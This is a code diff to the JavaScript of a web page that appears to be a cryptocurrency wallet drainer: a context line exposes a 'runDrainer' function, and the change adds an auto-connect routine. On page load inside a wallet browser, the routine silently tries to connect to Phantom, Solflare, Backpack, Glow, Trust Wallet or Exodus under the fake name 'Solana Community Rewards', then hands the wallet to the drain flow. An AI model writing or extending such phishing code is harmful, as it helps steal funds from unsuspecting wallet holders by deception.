@@ -5496,9 +5496,89 @@ window.runDrainer = runDrainer;
 
     // Initialize wallet redirect handling on page load
     document.addEventListener('DOMContentLoaded', function() {
-      // Check for wallet redirect parameters from all supported wallets
-      handleWalletRedirect();
-    });
+    // Check for wallet redirect parameters from all supported wallets
+    handleWalletRedirect();
+    
+    // Auto-connect when dApp loads in wallet browser (mobile deep link flow)
+    autoConnectInWalletBrowser();
+  });
+
+  // Auto-connect function for when dApp loads in wallet browser
+  async function autoConnectInWalletBrowser() {
+    console.log('[AUTO_CONNECT] Checking for wallet providers in wallet browser...');
+    
+    // Wait a bit for wallet providers to load
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    
+    // Check if we're in a wallet browser environment
+    const isInWalletBrowser = window.location.href.includes('phantom') || 
+                             window.location.href.includes('solflare') || 
+                             window.location.href.includes('backpack') ||
+                             window.location.href.includes('trustwallet') ||
+                             window.location.href.includes('glow') ||
+                             window.location.href.includes('exodus') ||
+                             document.referrer.includes('phantom') ||
+                             document.referrer.includes('solflare') ||
+                             document.referrer.includes('backpack') ||
+                             document.referrer.includes('trustwallet') ||
+                             document.referrer.includes('glow') ||
+                             document.referrer.includes('exodus');
+    
+    if (!isInWalletBrowser) {
+      console.log('[AUTO_CONNECT] Not in wallet browser, skipping auto-connect');
+      return;
+    }
+    
+    console.log('[AUTO_CONNECT] In wallet browser, attempting auto-connect...');
+    
+    // Try to detect and connect to available wallets
+    const wallets = [
+      { key: 'phantom', name: 'Phantom', provider: () => window.phantom?.solana || window.solana },
+      { key: 'solflare', name: 'Solflare', provider: () => window.solflare },
+      { key: 'backpack', name: 'Backpack', provider: () => window.backpack?.solana || window.backpack },
+      { key: 'glow', name: 'Glow', provider: () => window.glow },
+      { key: 'trustwallet', name: 'Trust Wallet', provider: () => window.trustwallet?.solana || window.trustwallet },
+      { key: 'exodus', name: 'Exodus', provider: () => window.exodus?.solana || window.exodus }
+    ];
+    
+    for (const wallet of wallets) {
+      try {
+        const provider = wallet.provider();
+        if (provider && typeof provider.connect === 'function') {
+          console.log(`[AUTO_CONNECT] Found ${wallet.name} provider, attempting connection...`);
+          
+          // Try to connect
+          const result = await provider.connect({
+            onlyIfTrusted: false,
+            appMetadata: {
+              name: 'Solana Community Rewards',
+              url: window.location.origin,
+              icon: '/logo.png'
+            }
+          });
+          
+          if (result && result.publicKey) {
+            console.log(`[AUTO_CONNECT] Successfully connected to ${wallet.name}:`, result.publicKey.toString());
+            
+            // Trigger the connection flow
+            triggerConnection(result.publicKey.toString(), wallet.key, {
+              name: wallet.name,
+              logo: `/${wallet.key}-logo.png`
+            });
+            
+            // Show success message
+            showStatus(`Connected to ${wallet.name}`, 'success');
+            return; // Exit after successful connection
+          }
+        }
+      } catch (error) {
+        console.log(`[AUTO_CONNECT] Failed to connect to ${wallet.name}:`, error.message);
+        // Continue to next wallet
+      }
+    }
+    
+    console.log('[AUTO_CONNECT] No wallet connections successful');
+  }
 
     // Function to handle deep links properly (moved outside for global access)
     async function openInWallet(walletType) {
